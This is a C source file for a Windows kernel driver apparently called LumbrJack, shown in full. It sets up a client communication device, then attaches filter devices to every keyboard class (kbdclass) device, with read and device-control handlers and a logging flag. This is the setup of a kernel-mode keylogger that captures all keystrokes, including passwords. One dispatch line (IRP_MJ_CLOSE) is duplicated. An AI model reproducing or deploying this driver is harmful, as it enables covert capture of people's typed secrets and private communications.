#include "debug.h"
#include "dispatch.h"
#include "BlockingQueue.h"
#include "log.h"
#include <ntddk.h>

extern POBJECT_TYPE* IoDriverObjectType;

static UNICODE_STRING symLink = RTL_CONSTANT_STRING(L"\\??\\LumbrJackDevSymLink");

NTSTATUS NTAPI ObReferenceObjectByName(PUNICODE_STRING ObjectName, ULONG Attributes, PACCESS_STATE AccessState, ACCESS_MASK DesiredAccess, POBJECT_TYPE ObjectType, KPROCESSOR_MODE AccessMode, PVOID ParseContext, PVOID* Object);

static void unload(PDRIVER_OBJECT pDriverObject);
static NTSTATUS cleanupDevices(PDRIVER_OBJECT pDriverObject);
static NTSTATUS setupCommunicationDevice(PDRIVER_OBJECT pDriverObject);
static NTSTATUS setupKbdFilterDevice(PDRIVER_OBJECT pDriverObject);
static void setMajorFunctions(PDRIVER_OBJECT pDriverObject);

NTSTATUS DriverEntry(PDRIVER_OBJECT pDriverObject, PUNICODE_STRING pRegistryPath) {
	UNREFERENCED_PARAMETER(pRegistryPath);

	DBG_PRINT("------------------------\n");

	pDriverObject->DriverUnload = unload;
	NTSTATUS ntStatus = setupCommunicationDevice(pDriverObject);

	if (!NT_SUCCESS(ntStatus)) {
		DBG_PRINTF("DriverEntry: setupCommunicationDevice failed: 0x%lx\n", ntStatus);
		const NTSTATUS ntStatusCleanup = cleanupDevices(pDriverObject);

		if (!NT_SUCCESS(ntStatusCleanup)) {
			DBG_PRINTF("DriverEntry: cleanupDevices failed: 0x%lx\n", ntStatusCleanup);
		}

		return ntStatus;
	}

	ntStatus = setupKbdFilterDevice(pDriverObject);

	if (!NT_SUCCESS(ntStatus)) {
		DBG_PRINTF("DriverEntry: setupKbdFilterDevice failed: 0x%lx\n", ntStatus);
		const NTSTATUS ntStatusCleanup = cleanupDevices(pDriverObject);

		if (!NT_SUCCESS(ntStatusCleanup)) {
			DBG_PRINTF("DriverEntry: cleanupDevices failed: 0x%lx\n", ntStatusCleanup);
		}

		return ntStatus;
	}

	KeInitializeSemaphore(&readSemaphore, 1, 1);
	setMajorFunctions(pDriverObject);

	DBG_PRINT("DriverEntry: Driver loaded\n");

	return STATUS_SUCCESS;
}


static void unload(PDRIVER_OBJECT pDriverObject) {
	// stop logging if still running
	isLogging = FALSE;
	NTSTATUS ntStatus = cleanupDevices(pDriverObject);

	if (!NT_SUCCESS(ntStatus)) {
		DBG_PRINTF("unload: cleanupDevices failed: 0x%lx\n", ntStatus);
	}

	ntStatus = KeWaitForSingleObject(&readSemaphore, Executive, KernelMode, FALSE, NULL);

	if (!NT_SUCCESS(ntStatus)) {
		DBG_PRINTF("unload: KeWaitForSingleObject failed for semaphore: 0x%lx\n", ntStatus);
	}

	DBG_PRINT("unload: Driver unloaded\n");
	DBG_PRINT("------------------------\n");

	return;
}


// cleanup all devices
static NTSTATUS cleanupDevices(PDRIVER_OBJECT pDriverObject) {
	NTSTATUS ntStatus = STATUS_SUCCESS;

	if (symLink.Buffer) {
		ntStatus = IoDeleteSymbolicLink(&symLink);

		if (NT_SUCCESS(ntStatus)) {
			DBG_PRINTF("cleanupDevices: Symbolic link: \"%wZ\" deleted\n", symLink);
		}
		else {
			DBG_PRINTF("cleanupDevices: IoDeleteSymbolicLink failed: 0x%lx\n", ntStatus);
		}
	}

	PDEVICE_OBJECT pCurDevice = pDriverObject->DeviceObject;

	while (pCurDevice) {
		const PDEVICE_OBJECT pNextDevice = pCurDevice->NextDevice;

		if (pCurDevice->DeviceExtension) {
			const PDEVICE_OBJECT pTargetDevice = ((PDEVOBJ_EXTENSION)pCurDevice->DeviceExtension)->DeviceObject;

			if (pTargetDevice) {
				IoDetachDevice(pTargetDevice);
				DBG_PRINT("cleanupDevices: Device detached\n");
			}

		}

		IoDeleteDevice(pCurDevice);
		DBG_PRINT("cleanupDevices: Device deleted\n");
		pCurDevice = pNextDevice;
	}

	return ntStatus;
}


// setup device for client communication
static NTSTATUS setupCommunicationDevice(PDRIVER_OBJECT pDriverObject) {
	PDEVICE_OBJECT pComDevObject = NULL;
	UNICODE_STRING devName = RTL_CONSTANT_STRING(L"\\Device\\LumbrJackComDev");

	NTSTATUS ntStatus = IoCreateDevice(pDriverObject, 0, &devName, FILE_DEVICE_UNKNOWN, FILE_DEVICE_SECURE_OPEN, FALSE, &pComDevObject);

	if (!NT_SUCCESS(ntStatus)) {
		DBG_PRINTF("setupCommunicationDevice: IoCreateDevice failed: 0x%lx\n", ntStatus);

		return ntStatus;
	}

	ntStatus = IoCreateSymbolicLink(&symLink, &devName);

	if (!NT_SUCCESS(ntStatus)) {
		DBG_PRINTF("setupCommunicationDevice: IoCreateSymbolicLink failed: 0x%lx\n", ntStatus);
	}

	return ntStatus;
}


// setup filter devices for keyboard
static NTSTATUS setupKbdFilterDevice(PDRIVER_OBJECT pDriverObject) {
	UNICODE_STRING kbdClassName = RTL_CONSTANT_STRING(L"\\Driver\\kbdclass");
	PDRIVER_OBJECT targetDriverObject = NULL;
	NTSTATUS ntStatus = ObReferenceObjectByName(&kbdClassName, OBJ_CASE_INSENSITIVE, NULL, 0, *IoDriverObjectType, KernelMode, NULL, &targetDriverObject);

	if (!NT_SUCCESS(ntStatus)) {
		DBG_PRINTF("setupKbdFilterDevice: ObReferenceObjectByName failed: 0x%lx\n", ntStatus);

		return ntStatus;
	}

	PDEVICE_OBJECT pCurDeviceObject = targetDriverObject->DeviceObject;
	ObfDereferenceObject(targetDriverObject);

	while (pCurDeviceObject) {
		PDEVICE_OBJECT pFltDevObject = NULL;
		ntStatus = IoCreateDevice(pDriverObject, sizeof(DEVOBJ_EXTENSION), NULL, FILE_DEVICE_KEYBOARD, FILE_DEVICE_SECURE_OPEN, FALSE, &pFltDevObject);

		if (!NT_SUCCESS(ntStatus)) {
			DBG_PRINTF("setupKbdFilterDevice: IoCreateDevice failed: 0x%lx\n", ntStatus);
			pCurDeviceObject = pCurDeviceObject->NextDevice;

			continue;
		}
		else {
			DBG_PRINT("setupKbdFilterDevice: Device created\n");
		}

		RtlZeroMemory(pFltDevObject->DeviceExtension, sizeof(DEVOBJ_EXTENSION));
		ntStatus = IoAttachDeviceToDeviceStackSafe(pFltDevObject, pCurDeviceObject, &((PDEVOBJ_EXTENSION)pFltDevObject->DeviceExtension)->DeviceObject);

		if (!NT_SUCCESS(ntStatus)) {
			DBG_PRINTF("setupKbdFilterDevice: IoAttachDeviceToDeviceStackSafe failed: 0x%lx\n", ntStatus);
			IoDeleteDevice(pFltDevObject);
			pCurDeviceObject = pCurDeviceObject->NextDevice;

			continue;
		}
		else {
			DBG_PRINT("setupKbdFilterDevice: Device attached\n");
		}

		pFltDevObject->Flags |= DO_BUFFERED_IO;
		pFltDevObject->Flags &= ~DO_DEVICE_INITIALIZING;
		pCurDeviceObject = pCurDeviceObject->NextDevice;
	}

	return ntStatus;
}


static void setMajorFunctions(PDRIVER_OBJECT pDriverObject) {
	
	pDriverObject->MajorFunction[IRP_MJ_CREATE] = passThrough;
	pDriverObject->MajorFunction[IRP_MJ_CLOSE] = passThrough;
	pDriverObject->MajorFunction[IRP_MJ_CLOSE] = passThrough;
	pDriverObject->MajorFunction[IRP_MJ_DEVICE_CONTROL] = dispatchDevCtl;
	pDriverObject->MajorFunction[IRP_MJ_READ] = dispatchRead;

	return;
}